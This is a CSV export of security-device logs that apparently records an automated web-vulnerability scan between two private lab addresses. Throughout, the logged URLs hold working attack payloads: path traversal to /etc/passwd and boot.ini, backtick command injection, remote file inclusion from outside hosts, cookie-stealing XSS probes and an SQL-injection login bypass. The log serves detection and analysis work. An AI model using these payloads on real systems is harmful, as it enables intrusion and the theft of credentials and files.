ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=/..../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=/
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=1753&amp;nn=c:\boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1.asp?n=c:\boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=`/etc/passwd`&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=..../..../..../..../..../..../..../etc.passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=../../../../../../../../../etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/....../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/.../.../.../.../.../.../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/../../../../../../../../etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=/etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=`/etc/passwd`&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=..../..../..../..../..../..../..../etc.passwd&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=../../../../../../../../../etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/....../boot.ini&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=`/etc/passwd`
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=..../..../..../..../..../..../..../etc.passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/....../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.../.../.../.../.../.../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../../../../../../../../../../../boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=c:\boot.ini
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=1771&amp;nn=c:\boot.ini&amp;page=1
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum1_professionnel.asp?n=c:\boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
9999,415384,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=`/etc/passwd`|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
9999,415385,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=../../../../../../../../../etc/passwd
30844,415363,32,3,HTTP Directory Traversal Request Attempt,info-leak,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/etc/passw*
31477,415364,4,3,Generic HTTP Cross Site Scripting Attempt,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/index.php?vo=\
32658,415364,4,3,HTTP Cross Site Scripting Attempt,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/index.php?vo=\
39766,415364,1,3,Novell ZENworks Mobile Management Cross-Site Scripting Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/index.php?vo=\
94328,415364,3,3,Generic Cross-Site Scripting Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/index.php?vo=\
9999,415386,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415387,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415388,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415389,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415390,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/
9999,415391,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/etc/passwd
9999,415392,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415393,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=268
9999,415393,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_arc.asp?n=c:\boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
9999,415394,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=`/etc/passwd`|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
9999,415395,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=..../..../..../..../..../..../..../etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415396,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=../../../../../../../../../etc/passwd
9999,415397,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415398,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415399,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415400,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415401,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/
9999,415402,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/etc/passwd
9999,415403,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415404,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=100
9999,415404,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum_professionnel.asp?n=c:\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions.inc.php+
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/get_od_toc.pl?Profile=
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/globals.php3
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/globals.pl
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/Gozila.cgi
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/helperfunction.php?includedir=http://cirt.net/rfiinc.txt?
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/homebet/homebet.dll?form=menu&amp;option=menu-signin
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/htmltonuke.php?filnavn=http://cirt.net/rfiinc.txt?
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/idealbb/error.asp?|-|0|404_Object_Not_Found
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found
9999,415405,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=`/etc/passwd`|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
9999,415406,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=..../..../..../..../..../..../..../etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415407,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=../../../../../../../../../etc/passwd
9999,415408,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415409,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415410,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415411,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415412,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/
9999,415413,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/etc/passwd
9999,415414,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
9999,415415,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/imprimer.asp?no=c:\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/include/customize.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/include/help.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/includes/footer.php3
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/includes/header.php3
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/infos/contact/index.asp
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/infos/faq/index.asp
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/infos/gen/index.asp
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/infos/services/index.asp
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/instaboard/index.cfm
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/intranet/browse.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/invitefriends.php3
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ipchat.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ixmail_netattach.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/jsptest.jsp+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/kernel/class/delete.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/kernel/classes/ezrole.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ldap.search.php3?ldap_serv=nonsense
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/livredor/index.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/login.php3?reason=chpass2
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mail/include.html
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mail/settings.html
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mail/src/read_body.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mambo/banners.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/manage/login.asp+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mantis/summary_graph_functions.php?g_jpgraph_path=http://attackershost/listings.txt?
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/members/ID.pm
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/members/ID.xbb
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/mod.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif/delete.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif/ident.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=`/etc/passwd`
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=..../..../..../..../..../..../..../etc.passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=../../../../../../../../../etc/passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/....../boot.ini
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/.../.../.../.../.../.../boot.ini
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/../../../../../../../../../etc/passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/etc/passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=/etc/passwd
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modif_infos.asp?n=c:\boot.ini
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/Downloads/voteinclude.php+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/Forums/attachment.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/Search/index.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/WebChat/in.php+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/WebChat/out.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/WebChat/quit.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/WebChat/users.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/modules/Your_Account/navbar.php+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/moregroupware/modules/webmail2/inc/
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/myguestBk/add1.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/myguestBk/admin/delEnt.asp?id=NEWSNUMBER|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/myguestBk/admin/index.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/netget?sid=Safety&amp;msg=2002&amp;file=Safety
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/newtopic.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/nphp/nphpd.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/OpenTopic
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/options.inc.php+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/oscommerce/default.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/parse_xml.cgi
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php/gaestebuch/admin/index.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/php/php4ts.dll
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pks/lookup
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pm/lib.inc.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/poppassd.php3+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/productcart/database/EIPC.mdb
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/productcart/pc/Custva.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/product_info.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/prometheus-all/index.php
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/protected/
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/protected/secret.html+
9999,415416,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039;
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/protection.php
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pt_config.inc
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pvote/add.php?question=AmIgAy&amp;o1=yes&amp;o2=yeah&amp;o3=well..yeah&amp;o4=bad
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pvote/del.php?pollorder=1
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/quikmail/nph-emumail.cgi?type=../
9999,415417,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/room/save_item.php
